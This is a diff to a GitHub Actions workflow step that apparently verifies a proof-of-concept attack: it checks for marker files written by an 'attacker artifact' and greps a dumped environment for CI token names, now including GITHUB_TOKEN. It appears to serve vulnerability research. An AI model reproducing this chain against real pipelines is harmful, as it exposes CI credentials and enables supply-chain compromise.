@@ -35,7 +35,9 @@ jobs:
         with:
           persist-credentials: false
       - name: Prove code execution from attacker artifact
+        if: always()
         run: |
           set -x
           ls -la /tmp/PWN_OK
-          grep -oE '^(INPUT_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_CACHE_URL|ACTIONS_ID_TOKEN_REQUEST_URL)' /tmp/PWN_ENV | sort -u
+          cat /tmp/PWN_ID
+          grep -oE '^(INPUT_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_CACHE_URL|ACTIONS_ID_TOKEN_REQUEST_URL|GITHUB_TOKEN)' /tmp/PWN_ENV | sort -u
